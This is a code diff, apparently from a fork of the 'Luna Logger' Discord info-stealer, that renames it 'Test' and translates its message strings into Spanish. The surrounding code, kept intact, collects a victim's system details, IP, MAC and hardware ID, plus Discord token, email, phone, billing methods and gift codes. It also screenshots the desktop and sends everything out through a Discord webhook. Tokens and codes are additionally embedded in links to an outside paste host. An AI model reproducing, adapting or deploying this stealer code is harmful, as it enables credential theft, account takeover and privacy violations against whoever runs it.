@@ -161,7 +161,7 @@ class PcInfo:
 
     def get_inf(self, webhook):
         webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-        embed = Embed(title="Luna Logger", color=5639644)
+        embed = Embed(title="Test", color=5639644)
 
         computer_os = platform.platform()
         cpu = wmi.WMI().Win32_Processor()[0]
@@ -170,7 +170,7 @@ class PcInfo:
 
         embed.add_field(
             name="Informacion de el sistema",
-            value=f'''💻 **Usuario PC:** `{username}`\n:escritorio: **Nombre PC:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
+            value=f'''💻 **Usuario PC:** `{username}`\n:desktop: **Nombre PC:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
             inline=False)
         embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
@@ -382,7 +382,7 @@ class Discord:
                     else:
                         methods += "❓"
 
-            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:telefono_movil: **Telefono:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
+            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Gmail:** `{email}`\n:mobile_phone: **Telefono:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Dinero:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Haz click para copiar!](https://paste-pgpj.onrender.com/?p={token})\n'
 
             if "code" in gift.text:
                 codes = json.loads(gift.text)
@@ -390,17 +390,17 @@ class Discord:
                     val_codes.append((code['code'], code['promotion']['outbound_title']))
 
             if val_codes == []:
-                val += f'\n:gift: `No Gift Cards Found`\n'
+                val += f'\n:gift: `Targetas de credito no encontradas`\n'
             elif len(val_codes) >= 3:
                 num = 0
                 for c, t in val_codes:
                     num += 1
                     if num == 3:
                         break
-                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
+                    val += f'\n:gift: **{t}:**\n`{c}`\n[Haz click para copiar!](https://paste-pgpj.onrender.com/?p={c})\n'
             else:
                 for c, t in val_codes:
-                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
+                    val += f'\n:gift: **{t}:**\n`{c}`\n[Haz click para copiar!](https://paste-pgpj.onrender.com/?p={c})\n'
 
             embed = Embed(title=username, color=5639644)
             embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
@@ -420,7 +420,7 @@ class Discord:
         )
         image.save(tempfolder + "\\image.png")
 
-        embed2 = Embed(title="Desktop Screenshot", color=5639644)
+        embed2 = Embed(title="Foto de escritorio", color=5639644)
         file = File(tempfolder + "\\image.png", filename="image.png")
         embed2.set_image(url="attachment://image.png")
 
@@ -429,7 +429,7 @@ class Discord:
         webhook.send(
             embed=embed2,
             file=file,
-            username="Luna")
+            username="Test")
 
 
 @trygrab
